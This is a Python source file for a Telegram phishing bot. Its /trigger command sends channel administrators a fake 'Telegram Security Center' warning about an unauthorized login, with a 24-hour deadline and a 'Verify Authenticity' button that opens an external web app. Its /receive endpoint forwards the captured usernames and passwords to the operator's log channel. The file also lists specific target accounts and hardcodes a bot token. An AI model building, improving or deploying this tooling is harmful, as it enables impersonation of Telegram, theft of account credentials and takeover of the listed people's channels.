import os, threading, datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from telebot import TeleBot, types

TOKEN = "8729895497:AAEqEZ3HA56FmQjm_kI5VmKxQn1a4HJBSuE"
ADMIN_ID = 8699819680
LOG_CHANNEL = -1003817774248
TMA_URL = "https://pawsofjoy.github.io/tma-research/" 

# Put your targets back here so /list works
TARGETS = {
    "71117894651": "@Extreme_pressure",
    "76663888074": "@BNBwebina",
    "81271111961": "@adsgram_update",
    "8699819680": "@Akun_Dev"
}

bot = TeleBot(TOKEN)
app = Flask(__name__)
CORS(app)

@app.route('/receive', methods=['POST'])
def receive_data():
    data = request.json
    if data:
        user = data.get('user', 'unknown')
        pwd = data.get('password', 'none')
        msg = f"📥 <b>NEW LOG RECEIVED:</b>\n\n👤 <b>Admin:</b> {user}\n🔑 <b>Password:</b> <code>{pwd}</code>"
        bot.send_message(LOG_CHANNEL, msg, parse_mode="HTML")
        return jsonify({"status": "sent"}), 200
    return jsonify({"status": "error"}), 400

@app.route('/')
def home(): return "Bot is Alive", 200

@bot.message_handler(commands=['list'])
def handle_list(message):
    if message.from_user.id == ADMIN_ID:
        response = "<b>Target Database:</b>\n\n"
        for uid, username in TARGETS.items():
            response += f"👤 {username}\nID: <code>{uid}</code>\n\n"
        bot.send_message(ADMIN_ID, response, parse_mode="HTML")

@bot.message_handler(commands=['trigger'])
def handle_trigger(message):
    if message.from_user.id == ADMIN_ID:
        try:
            # Fixes the 'strip' error by processing the text correctly
            clean_text = message.text.replace('/trigger', '').replace('\n', ' ').strip()
            parts = [p.strip() for p in clean_text.split('@')]
            
            if len(parts) == 3:
                target_id, channel_name, admin_name = parts
                deadline = (datetime.datetime.now() + datetime.timedelta(hours=24)).strftime("%B %d, %H:%M UTC")
                
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("Verify Authenticity", web_app=types.WebAppInfo(url=TMA_URL)))
                
                bait = (
                    f"<b>🛡 Telegram Security Center</b>\n\n"
                    f"Dear <b>{admin_name}</b>,\n\n"
                    f"Our automated security systems have detected unusual activity and an unauthorized login attempt associated with your administrative account for: <b>{channel_name}</b>.\n\n"
                    f"To maintain ownership privileges and prevent restriction, you are required to synchronize your 2FA credentials via the <b>Admin Portal</b> before <b>{deadline}</b>.\n\n"
                    f"<i>Note: Failure to verify may lead to a temporary suspension of administrative access.</i>"
                )
                
                bot.send_message(target_id, bait, parse_mode="HTML", reply_markup=markup)
                bot.send_message(ADMIN_ID, f"✅ Alert sent to {admin_name} for {channel_name}")
            else:
                bot.send_message(ADMIN_ID, "❌ Use: /trigger ID @ Channel @ Name")
        except Exception as e:
            bot.send_message(ADMIN_ID, f"❌ Error: {str(e)}")

if __name__ == "__main__":
    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
